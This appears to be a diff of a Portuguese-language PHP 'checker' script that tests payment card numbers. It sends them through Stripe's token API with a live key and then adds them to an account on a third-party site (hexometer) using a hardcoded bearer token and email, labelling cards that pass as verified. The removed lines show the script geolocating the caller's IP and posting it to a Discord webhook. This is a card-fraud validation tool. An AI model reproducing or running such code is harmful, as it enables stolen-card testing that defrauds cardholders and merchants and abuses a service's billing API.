@@ -3,7 +3,6 @@ date_default_timezone_set('America/Sao_Paulo');
 $tempo_real = date('d/m/Y h:i:s a', time()); 
 
 
-
 // ================================================================
 // =     __  __ _____ _____ ____      _    _     _   _    _       =
 // =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
@@ -398,6 +397,8 @@ $telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');
 
 // ================ // ====================//==========================//============================= // ================================//=================//
 
+$bearrer = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjkwMDY3IiwidmVyc2lvbiI6MiwidXNlclR5cGUiOiJ1c2VyIiwiaWF0IjoxNjY2NTY5NzAzLCJleHAiOjE2NjY1NzMzMDN9.274hwcnXuZLADpyeBDBDoQDwZDSZ6MLaVquUGTUg_D8';
+
 
 $header_stripesrc = array (
 
@@ -416,7 +417,7 @@ $header_stripesrc = array (
 $link_stripesrc = "https://api.stripe.com/v1/tokens";
 
 
-$postfields_stripesrc = 'time_on_page=289270&pasted_fields=number&guid=NA&muid=31451609-7842-4a7e-8d65-a8238a82adbff2b0f6&sid=29b8a38b-ef56-46a4-bf40-33b558f36c5b3f97ea&key=pk_live_8KwSrH69LnrJea7rrCH7Phn1&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'';
+$postfields_stripesrc = 'time_on_page=154447&pasted_fields=number&guid=NA&muid=31451609-7842-4a7e-8d65-a8238a82adbff2b0f6&sid=37a5ffe1-e310-41ce-8c43-b85627bb158944720a&key=pk_live_8KwSrH69LnrJea7rrCH7Phn1&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'';
 
 
 
@@ -437,7 +438,7 @@ $id_do_carai = metraiapuxar($stripe, 'id": "', '"', 1);
 $header_pagar = array (
 
 'accept: */*',
-'authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjkwMDY3IiwidmVyc2lvbiI6MiwidXNlclR5cGUiOiJ1c2VyIiwiaWF0IjoxNjY2NTA1MTI5LCJleHAiOjE2NjY1MDg3Mjl9.BtUCFI_oGsTVptqCesjFz1OEXokpP0RpYlAZX6ZCARw', // TROQUE CONFORME NOVA CONTA É LÓGICO QUE IRA USAR NOVA CONTA ENTAO TROCA PORRA.
+'authorization: '.$bearrer.'',
 'content-type: application/json',
 'origin: https://dash.hexometer.com',
 'referer: https://dash.hexometer.com/',
@@ -451,7 +452,7 @@ $header_pagar = array (
 
 $link_pagar = "https://api.hexometer.com/v2/ql";
 
-$postfields_pagar = '{"operationName":"addCard","variables":{"settings":{"email":TROQUE-O-EMAIL-PARA-O-EMAIL-DA-CONTA-EM-QUE-USARÁ","name":"'.$nome.'","source":"'.$id_do_carai.'"}},"query":"mutation addCard($settings: AddCardInput) {\n  BillingOps {\n    addCard(settings: $settings) {\n      error_code\n      cardId\n    }\n  }\n}\n"}';
+$postfields_pagar = '{"operationName":"addCard","variables":{"settings":{"email":"metralhadosbaile2021@gmail.com","name":"'.$nome.'","source":"'.$id_do_carai.'"}},"query":"mutation addCard($settings: AddCardInput) {\n  BillingOps {\n    addCard(settings: $settings) {\n      error_code\n      cardId\n    }\n  }\n}\n"}';
 
 
 
@@ -465,7 +466,7 @@ curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ini, CURLOPT_HTTPHEADER, $header_pagar);
 curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_pagar);
- $pagar = curl_exec($ini);
+$pagar = curl_exec($ini);
 
 
 $link_carteiracard = "https://api.hexometer.com/v2/ql";
@@ -475,7 +476,7 @@ $post_carteira = '{"operationName":null,"variables":{"settings":{"limit":100}},"
 $header_carteira = array (
 
 'accept: */*',
-'authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjkwMDY3IiwidmVyc2lvbiI6MiwidXNlclR5cGUiOiJ1c2VyIiwiaWF0IjoxNjY2NTA1MTI5LCJleHAiOjE2NjY1MDg3Mjl9.BtUCFI_oGsTVptqCesjFz1OEXokpP0RpYlAZX6ZCARw',
+'authorization: '.$bearrer.'',
 'content-type: application/json',
 'origin: https://dash.hexometer.com',
 'referer: https://dash.hexometer.com/',
@@ -499,42 +500,12 @@ curl_setopt($ini, CURLOPT_POSTFIELDS, $post_carteira);
 $carteira = curl_exec($ini);
 
 
-$header_localizarip = array (
+if (strpos($pagar, '{"data":{"BillingOps":{"addCard":{"error_code":null,"cardId":null}}}}')!==false) {
 
-'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'content-type: application/x-www-form-urlencoded',
-'origin: https://localizeip.com.br',
-'referer: https://localizeip.com.br/',
-'sec-fetch-dest: document',
-'sec-fetch-mode: navigate',
-'sec-fetch-site: same-origin',
-'upgrade-insecure-requests: 1',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'
-
-);
-
-$link_localizarip = "https://localizeip.com.br/";
-
-$postfields_localizarip = 'valor='.$ip.'';
+    die ("#Error => Checker caiu contate o devellopper");
 
 
-$ini = curl_init();
-curl_setopt($ini, CURLOPT_URL, $link_localizarip);
-curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ini, CURLOPT_HTTPHEADER, $header_localizarip);
-curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_localizarip);
-$localizar_ip = curl_exec($ini);
-
-
-$ip_pais = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>País:</b>','</div>', 1);
-$estado_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Estado:</b>','</div>', 1);
-$cidade_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Cidade:</b>','</div>', 1);
-$provedor_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Provedor:</b>','</div>', 1);
-
-
-
+}
 
 
 $cartoes = metraiapuxar($carteira, '"cards":[{','}],', 1);
@@ -543,6 +514,22 @@ $contar_cartoes = substr_count($cartoes, 'id');
 
 
 $result = metraiapuxar($pagar, '"error_code":"','"', 1);
+
+
+$internal = metraiapuxar($pagar, '"code":"','"', 1);
+
+
+if (empty($internal)!== false) {
+
+
+    $error_codee = "Falha (N/A)";
+
+} else {
+
+
+    $error_codee = ''.$internal.'';
+
+}
 
 
 if (empty($cartoes)!== false) {
@@ -561,7 +548,7 @@ if (empty($cartoes)!== false) {
 if (empty($result)!== false) {
 
 
-    $retorno = "Falha (N/A)";
+    $retorno = 'Falha (N/A) - '.$error_codee.'';
 
 
 } else {
@@ -601,31 +588,6 @@ if (empty($pagar)!== false) {
 
     $Verificacao_live = 'Cartao verificado, e incluido na carteira de pagamentos. (Auth-Card) / CARTOES VINCULADOS: '.$vinculados.'';
 
-
-}
-
-
-if (empty($ip)!== false) {
-
-    $webhook_ip = "Não foi encontrado nenhum IP.";
-
-} else {
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1031070546328289351/uiBb3CxmwBluxtFNV1bAzR_QyIoztzpk2YdEJKVyBu4cHTnFjioqI3TCTcpl5wbBSrg6');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip");
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en',
-'content-type: application/json',
-'origin: https://discohook.org',
-'referer: https://discohook.org/',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36'));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"STATUS","avatar_url":"https://cdn.discordapp.com/attachments/1000611490568609883/1023802237463576606/pepefrg-8.gif","content":"","embeds":[{"color":3447003,"description":"**REQUESTS:**\n\n```A máquina de IP: '.$ip.'\n\nEsta fazendo requisicões na API [ STRIPE AUTH]..\n\nINFORMACOES:\n\nPaís: '.$ip_pais.'\nEstado: '.$estado_ip.'\nCidade: '.$cidade_ip.'\nProvedor: '.$provedor_ip.'\n\nData: '.$tempo_real.'\n\n```","timestamp":"","author":{"name":"STATUS CHECKERS"},"image":{},"thumbnail":{},"footer":{"text":"Dev: Metralha"},"fields":[]}],"components":[]}');
-$infos = curl_exec($ch);
 
 }
 
